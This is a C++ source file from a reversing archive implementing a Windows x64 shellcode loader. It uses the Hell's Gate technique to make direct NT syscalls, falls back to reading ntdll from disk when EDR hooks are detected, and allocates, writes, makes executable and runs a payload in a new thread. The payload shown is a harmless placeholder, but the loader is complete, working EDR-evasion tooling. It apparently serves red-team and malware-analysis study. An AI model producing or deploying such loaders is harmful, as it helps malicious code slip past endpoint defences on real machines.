/*
    Shellcode Loader
    Archive of Reversing.ID

    Directly invoke NT syscall by extracting the syscall number (SSN)
    from the ntdll stub in memory.
    If the stub is hooked (patched by EDR), fall back to reading ntdll.dll from disk.

Compile:
    $ ml64.exe /nologo /c hellsgate.asm
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tpcode.cpp hellsgate.obj

Technique:
    - access:       Hell's Gate (direct syscall, disk fallback on hook)
    - allocation:   NtAllocateVirtualMemory (hell's gate)
    - writing:      RtlMoveMemory
    - permission:   NtProtectVirtualMemory  (hell's gate)
    - execution:    CreateThread

Note:
    - x64 only (Windows 10+ ntdll stub layout)
    - original Hell's Gate implementation does not have fallback mechanism to load ntdll from disk.
    - 
*/

#ifndef _WIN64
#error "Hell's Gate requires x64 (Windows 10+ ntdll stub layout)"
#endif

#include <windows.h>
#include <stdint.h>

extern "C" void  HellsGate (WORD wSystemCall);
extern "C" PVOID HellDescent (void);

/* ========= PEB / loader structures ========= */
typedef struct _MY_UNICODE_STRING {
    USHORT  Length;
    USHORT  MaximumLength;
    PWSTR   Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_LDR_ENTRY {
    LIST_ENTRY          InLoadOrderLinks;
    LIST_ENTRY          InMemoryOrderLinks;
    LIST_ENTRY          InInitializationOrderLinks;
    PVOID               DllBase;
    PVOID               EntryPoint;
    ULONG               SizeOfImage;
    MY_UNICODE_STRING   FullDllName;
    MY_UNICODE_STRING   BaseDllName;
} MY_LDR_ENTRY, *PMY_LDR_ENTRY;

typedef struct _MY_PEB_LDR_DATA {
    ULONG       Length;
    BOOL        Initialized;
    PVOID       SsHandle;
    LIST_ENTRY  InLoadOrderModuleList;
    LIST_ENTRY  InMemoryOrderModuleList;
    LIST_ENTRY  InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

/* ========= NT function signatures ========= */
typedef NTSTATUS NTAPI NtAllocateVirtualMemory_t(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS NTAPI NtProtectVirtualMemory_t(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);

// pointer to function
typedef NtAllocateVirtualMemory_t FAR * pNtAllocateVirtualMemory;
typedef NtProtectVirtualMemory_t  FAR * pNtProtectVirtualMemory;

/* ========= ntdll helpers ========= */

static PVOID get_ntdll_base ()
{
    PMY_PEB_LDR_DATA ldr;
    PLIST_ENTRY      entry;

    // ntdll.dll is always the second entry in InMemoryOrderModuleList
    // (first entry is the main executable)
    ldr   = *(PMY_PEB_LDR_DATA *) (__readgsqword (0x60) + 0x18);
    entry = ldr->InMemoryOrderModuleList.Flink->Flink;
    return CONTAINING_RECORD (entry, MY_LDR_ENTRY, InMemoryOrderLinks)->DllBase;
}

static PVOID get_fn_addr (PVOID base, LPCSTR name)
{
    PBYTE                   b   = (PBYTE) base;
    PIMAGE_DOS_HEADER       dos = (PIMAGE_DOS_HEADER) b;
    PIMAGE_NT_HEADERS       nt  = (PIMAGE_NT_HEADERS) (b + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY) (b +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD * names    = (DWORD *) (b + exp->AddressOfNames);
    WORD  * ordinals = (WORD *)  (b + exp->AddressOfNameOrdinals);
    DWORD * funcs    = (DWORD *) (b + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++)
    {
        if (lstrcmpA ((LPCSTR)(b + names[i]), name) == 0)
            return b + funcs[ordinals[i]];
    }
    return NULL;
}

/* ========= SSN extraction ========= */

// clean NT syscall stub starts with: mov r10,rcx (4C 8B D1) + mov eax,imm (B8)
static BOOL is_clean_stub (PBYTE stub)
{
    return stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8;
}

static WORD read_ssn (PBYTE stub)
{
    return *(WORD *)(stub + 4);
}

/* ========= Fallback Mechanism ========= */

// fallback: map ntdll.dll from disk (not patched by EDR) and read the SSN there
static BOOL get_ssn_from_disk (LPCSTR fn_name, PWORD out_ssn)
{
    HANDLE h_file = CreateFileA ("C:\\Windows\\System32\\ntdll.dll",
                                 GENERIC_READ, FILE_SHARE_READ, NULL,
                                 OPEN_EXISTING, 0, NULL);
    if (h_file == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE h_map = CreateFileMappingA (h_file, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!h_map) { CloseHandle (h_file); return FALSE; }

    PVOID view = MapViewOfFile (h_map, FILE_MAP_READ, 0, 0, 0);
    BOOL  found = FALSE;

    if (view)
    {
        PVOID fn = get_fn_addr (view, fn_name);
        if (fn && is_clean_stub ((PBYTE) fn))
        {
            *out_ssn = read_ssn ((PBYTE) fn);
            found = TRUE;
        }
        UnmapViewOfFile (view);
    }

    CloseHandle (h_map);
    CloseHandle (h_file);
    return found;
}

static BOOL hells_gate (PVOID ntdll_base, LPCSTR fn_name, PWORD out_ssn)
{
    PVOID fn = get_fn_addr (ntdll_base, fn_name);
    if (!fn) return FALSE;

    // stub is unhooked: read SSN directly
    if (is_clean_stub ((PBYTE) fn))
    {
        *out_ssn = read_ssn ((PBYTE) fn);
        return TRUE;
    }

    // stub is patched: read from the on-disk copy of ntdll
    return get_ssn_from_disk (fn_name, out_ssn);
}

/* ======================================================= */

int main ()
{
    void *   runtime     = NULL;
    SIZE_T   size;
    ULONG    old_protect = 0;
    NTSTATUS status;
    HANDLE   h_thread;

    uint8_t  payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t payload_len = 4;

    WORD ssn_alloc   = 0;
    WORD ssn_protect = 0;

    // resolve ntdll base
    PVOID ntdll = get_ntdll_base ();

    // extract SSNs — disk fallback fires automatically if stubs are hooked
    if (!hells_gate (ntdll, "NtAllocateVirtualMemory", &ssn_alloc))   return 1;
    if (!hells_gate (ntdll, "NtProtectVirtualMemory",  &ssn_protect)) return 1;

    // allocate memory for payload as READ-WRITE (no executable)
    size   = payload_len;
    HellsGate (ssn_alloc);
    status = ((pNtAllocateVirtualMemory) HellDescent) (
        GetCurrentProcess (), 
        &runtime, 
        0, 
        &size,
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    );
    if (status != 0) return 1;

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    size   = payload_len;
    HellsGate (ssn_protect);
    status = ((pNtProtectVirtualMemory) HellDescent) (
        GetCurrentProcess (), 
        &runtime, 
        &size,
        PAGE_EXECUTE_READ, 
        &old_protect
    );
    if (status == 0)
    {
        h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (h_thread, -1);
    }

    return 0;
}
